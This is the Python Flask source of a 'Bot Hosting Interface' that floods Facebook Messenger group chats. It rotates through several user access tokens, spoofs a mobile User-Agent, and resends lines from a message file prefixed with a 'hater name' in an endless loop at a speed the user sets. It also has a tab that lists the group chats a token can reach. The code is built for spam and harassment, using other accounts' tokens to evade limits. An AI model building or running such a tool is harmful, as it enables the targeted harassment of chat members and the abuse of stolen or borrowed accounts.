from flask import Flask, render_template_string, request, redirect, url_for, jsonify
import requests
import json
import time
import os
import threading
from datetime import datetime
import uuid

app = Flask(__name__)

# Global variables
active_tasks = {}
logs = {}

html_content = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Hosting Interface</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f4f4f4;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 1200px;
            margin: auto;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        .tabs {
            display: flex;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .tab {
            padding: 10px 20px;
            cursor: pointer;
            background-color: #f1f1f1;
            border: 1px solid #ddd;
            border-bottom: none;
            border-radius: 5px 5px 0 0;
            margin-right: 5px;
            margin-bottom: 5px;
        }
        .tab.active {
            background-color: #fff;
            font-weight: bold;
        }
        .tab-content {
            display: none;
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 0 0 5px 5px;
        }
        .tab-content.active {
            display: block;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input[type="text"],
        input[type="number"],
        textarea,
        input[type="file"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        textarea {
            resize: vertical;
            min-height: 100px;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-bottom: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .button-danger {
            background-color: #dc3545;
        }
        .button-danger:hover {
            background-color: #c82333;
        }
        .button-success {
            background-color: #28a745;
        }
        .button-success:hover {
            background-color: #218838;
        }
        .button-info {
            background-color: #17a2b8;
        }
        .button-info:hover {
            background-color: #138496;
        }
        .log-container {
            height: 300px;
            overflow-y: auto;
            border: 1px solid #ddd;
            padding: 10px;
            margin-bottom: 15px;
            background-color: #f8f9fa;
            font-family: monospace;
            font-size: 12px;
        }
        .task-item {
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-bottom: 15px;
            background-color: #f8f9fa;
        }
        .task-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .task-title {
            font-weight: bold;
            font-size: 16px;
        }
        .task-status {
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 12px;
        }
        .status-running {
            background-color: #d4edda;
            color: #155724;
        }
        .status-stopped {
            background-color: #f8d7da;
            color: #721c24;
        }
        .group-list {
            max-height: 300px;
            overflow-y: auto;
            margin-top: 10px;
        }
        .group-item {
            padding: 8px;
            border-bottom: 1px solid #ddd;
            cursor: pointer;
        }
        .group-item:hover {
            background-color: #e9ecef;
        }
        .group-item:last-child {
            border-bottom: none;
        }
        .token-result {
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .token-valid {
            background-color: #d4edda;
            border-color: #c3e6cb;
        }
        .token-invalid {
            background-color: #f8d7da;
            border-color: #f5c6cb;
        }
    </style>
    <script>
        function showTab(tabName) {
            var tabs = document.getElementsByClassName('tab-content');
            for (var i = 0; i < tabs.length; i++) {
                tabs[i].classList.remove('active');
            }
            var tabButtons = document.getElementsByClassName('tab');
            for (var i = 0; i < tabButtons.length; i++) {
                tabButtons[i].classList.remove('active');
            }
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        function stopTask(taskId) {
            fetch('/stop_task', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({task_id: taskId})
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    location.reload();
                }
            });
        }

        function fetchGroups() {
            var token = document.getElementById('group_token').value;
            if (!token) {
                alert('Please enter a token first');
                return;
            }
            
            fetch('/fetch_groups', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({token: token})
            })
            .then(response => response.json())
            .then(data => {
                var groupList = document.getElementById('group-list');
                groupList.innerHTML = '';
                
                if (data.groups && data.groups.length > 0) {
                    data.groups.forEach(function(group) {
                        var groupDiv = document.createElement('div');
                        groupDiv.className = 'group-item';
                        groupDiv.innerHTML = '<strong>' + group.name + '</strong><br>ID: ' + group.id;
                        groupDiv.onclick = function() {
                            document.getElementById('convo_uid').value = group.id;
                            showTab('run-bot');
                        };
                        groupList.appendChild(groupDiv);
                    });
                } else {
                    groupList.innerHTML = '<p>No messenger groups found or error occurred.</p>';
                }
            });
        }

        function refreshLogs() {
            fetch('/get_logs')
            .then(response => response.json())
            .then(data => {
                // Update task logs
                for (var taskId in data.task_logs) {
                    var logContainer = document.getElementById('log-' + taskId);
                    if (logContainer) {
                        logContainer.innerHTML = data.task_logs[taskId].logs.join('<br>');
                        logContainer.scrollTop = logContainer.scrollHeight;
                    }
                }
            });
        }

        // Auto refresh logs every 2 seconds
        setInterval(refreshLogs, 2000);
    </script>
</head>
<body>
    <div class="container">
        <h1>Bot Hosting Interface</h1>
        
        <div class="tabs">
            <div class="tab active" onclick="showTab('run-bot')">Run Bot</div>
            <div class="tab" onclick="showTab('group-finder')">Find Groups</div>
            <div class="tab" onclick="showTab('active-tasks')">Active Tasks</div>
        </div>

        <!-- Run Bot Tab -->
        <div id="run-bot" class="tab-content active">
            <form action="/run_bot" method="post" enctype="multipart/form-data">
                <label for="convo_uid">Messenger Group UID:</label>
                <input type="text" id="convo_uid" name="convo_uid" required>

                <label for="token">Token (one per line):</label>
                <textarea id="token" name="token" required></textarea>

                <label for="message_file">Message File (one message per line):</label>
                <input type="file" id="message_file" name="message_file" accept=".txt" required>

                <label for="speed">Speed (seconds per message):</label>
                <input type="number" id="speed" name="speed" value="1" min="0" step="1" required>

                <label for="haters_name">Hater Name:</label>
                <input type="text" id="haters_name" name="haters_name" required>

                <button type="submit" class="button-success">Run Bot</button>
            </form>
        </div>

        <!-- Group Finder Tab -->
        <div id="group-finder" class="tab-content">
            <label for="group_token">Enter Token to Find Messenger Groups:</label>
            <textarea id="group_token" placeholder="Enter your Facebook token here"></textarea>
            <button onclick="fetchGroups()" class="button-info">Find Messenger Groups</button>
            
            <div class="group-list" id="group-list">
                <p>Enter a token and click "Find Messenger Groups" to see available groups.</p>
            </div>
        </div>

        <!-- Active Tasks Tab -->
        <div id="active-tasks" class="tab-content">
            <h3>Active Tasks</h3>
            {% for task_id, task_info in active_tasks.items() %}
            <div class="task-item">
                <div class="task-header">
                    <div class="task-title">{{ task_info.name }}</div>
                    <div>
                        <span class="task-status status-{{ task_info.status }}">{{ task_info.status.upper() }}</span>
                        {% if task_info.status == 'running' %}
                        <button onclick="stopTask('{{ task_id }}')" class="button-danger" style="width: auto; margin-left: 10px;">Stop</button>
                        {% endif %}
                    </div>
                </div>
                <div class="log-container" id="log-{{ task_id }}">
                    {% for log in logs.get(task_id, []) %}
                    {{ log }}<br>
                    {% endfor %}
                </div>
            </div>
            {% endfor %}
            
            {% if not active_tasks %}
            <p>No active tasks.</p>
            {% endif %}
        </div>
    </div>
</body>
</html>
'''

def add_log(task_id, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    
    if task_id not in logs:
        logs[task_id] = []
    
    logs[task_id].append(log_entry)
    
    # Keep only last 100 logs per task
    if len(logs[task_id]) > 100:
        logs[task_id] = logs[task_id][-100:]

def fetch_messenger_groups(token):
    """Fetch Messenger conversations/groups for a given token"""
    try:
        # Try to get conversations from Facebook Graph API
        url = f"https://graph.facebook.com/v17.0/me/conversations?access_token={token}&limit=50"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            groups = []
            
            if 'data' in data:
                for conversation in data['data']:
                    # Check if it's a group conversation (has multiple participants)
                    participants_url = f"https://graph.facebook.com/v17.0/{conversation['id']}/participants?access_token={token}"
                    participants_response = requests.get(participants_url)
                    
                    if participants_response.status_code == 200:
                        participants_data = participants_response.json()
                        if 'data' in participants_data and len(participants_data['data']) > 2:
                            # This is a group conversation
                            group_name = conversation.get('name', f"Group {conversation['id']}")
                            groups.append({
                                'id': conversation['id'],
                                'name': group_name
                            })
            
            return {'success': True, 'groups': groups}
        else:
            return {'success': False, 'error': f'API Error: {response.status_code}'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

def send_messages(task_id, convo_uid, tokens, message_content, speed, haters_name):
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    messages = message_content.splitlines()
    token_list = tokens.splitlines()

    num_messages = len(messages)
    num_tokens = len(token_list)
    max_tokens = min(num_tokens, num_messages)

    add_log(task_id, f"Started sending messages to conversation {convo_uid}")
    add_log(task_id, f"Total messages: {num_messages}, Total tokens: {num_tokens}")

    while active_tasks.get(task_id, {}).get('status') == 'running':
        try:
            for message_index in range(num_messages):
                if active_tasks.get(task_id, {}).get('status') != 'running':
                    break
                    
                token_index = message_index % max_tokens
                access_token = token_list[token_index].strip()

                message = messages[message_index].strip()

                url = f"https://graph.facebook.com/v17.0/{convo_uid}/messages"
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    add_log(task_id, f"✓ Message {message_index + 1} sent: {haters_name} {message}")
                else:
                    add_log(task_id, f"✗ Failed to send message {message_index + 1}: {response.text}")
                
                time.sleep(speed)

            add_log(task_id, "All messages sent. Restarting the process...")
        except Exception as e:
            add_log(task_id, f"Error occurred: {e}")
            time.sleep(5)

    add_log(task_id, "Task stopped")
    if task_id in active_tasks:
        active_tasks[task_id]['status'] = 'stopped'

@app.route('/')
def index():
    return render_template_string(html_content, active_tasks=active_tasks, logs=logs)

@app.route('/run_bot', methods=['POST'])
def run_bot():
    convo_uid = request.form['convo_uid']
    token = request.form['token']
    speed = int(request.form['speed'])
    haters_name = request.form['haters_name']

    message_file = request.files['message_file']
    message_content = message_file.read().decode('utf-8')

    # Generate unique task ID
    task_id = str(uuid.uuid4())
    
    # Create task info
    task_name = f"Bot for {convo_uid} - {haters_name}"
    active_tasks[task_id] = {
        'name': task_name,
        'status': 'running',
        'convo_uid': convo_uid,
        'haters_name': haters_name,
        'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    # Start message sending thread
    message_thread = threading.Thread(target=send_messages, args=(task_id, convo_uid, token, message_content, speed, haters_name))
    message_thread.daemon = True
    message_thread.start()

    return redirect(url_for('index'))

@app.route('/stop_task', methods=['POST'])
def stop_task():
    data = request.json
    task_id = data.get('task_id')
    
    if task_id in active_tasks:
        active_tasks[task_id]['status'] = 'stopped'
        add_log(task_id, "Task stopped by user")
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/fetch_groups', methods=['POST'])
def fetch_groups():
    data = request.json
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({'success': False, 'error': 'Token is required'})
    
    result = fetch_messenger_groups(token)
    return jsonify(result)

@app.route('/get_logs')
def get_logs():
    # Prepare logs for all active tasks
    task_logs = {}
    for task_id, task_info in active_tasks.items():
        if task_id in logs:
            task_logs[task_id] = {
                'name': task_info['name'],
                'logs': logs[task_id]
            }
    
    return jsonify({'task_logs': task_logs})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)

